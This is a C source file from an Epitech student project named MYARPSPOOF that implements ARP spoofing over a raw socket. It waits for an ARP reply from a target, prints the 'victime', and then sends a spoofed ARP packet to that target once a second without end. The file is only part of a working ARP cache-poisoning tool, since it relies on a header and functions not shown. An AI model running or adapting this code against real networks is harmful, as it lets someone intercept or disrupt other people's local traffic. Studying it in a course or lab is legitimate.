/*
** EPITECH PROJECT, 2018
** MYARPSPOOF
** File description:
** snd_rcv_func.c
*/

#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include "spoof.h"

void loop_send(int sd, infohdr_t *send, char **av)
{
    while (true) {
        send_arp(sd, send);
        printf("Spoofed packet sent to '%s'\n", av[1]);
        sleep(1);
    }
}
void send_arp(int sd, infohdr_t *send)
{
    int ret = 0;

    send->buf[32] = 0x00;
    if ((ret = sendto(sd, send->buf, 42, 0
            , (struct sockaddr *)&send->sock_addr
            , sizeof(send->sock_addr))) == -1) {
        perror("Failed sendto");
        exit(FAILURE);
    }
}

void receiv_arp(int sd, infohdr_t *fsend, infohdr_t *rcv, char **av)
{
    infohdr_t lsend;

    rcv->eth = (struct ethhdr *)rcv->buf;
    rcv->arp = (arp_header_t *)(rcv->buf + ETH2_HEADER_LEN);
    memset(rcv->buf, 0x00, BUF_SIZE);
    while (true) {
        if (recvfrom(sd, rcv->buf, BUF_SIZE, 0, NULL, NULL) == -1) {
            perror("Failed recvfrom");
            exit(FAILURE);
        }
        if (htons(rcv->eth->h_proto) == PROTO_ARP) {
            print_victime(rcv->arp);
            prepare_last_send(rcv, fsend, &lsend, av);
            loop_send(sd, &lsend, av);
            break;
        }
    }
}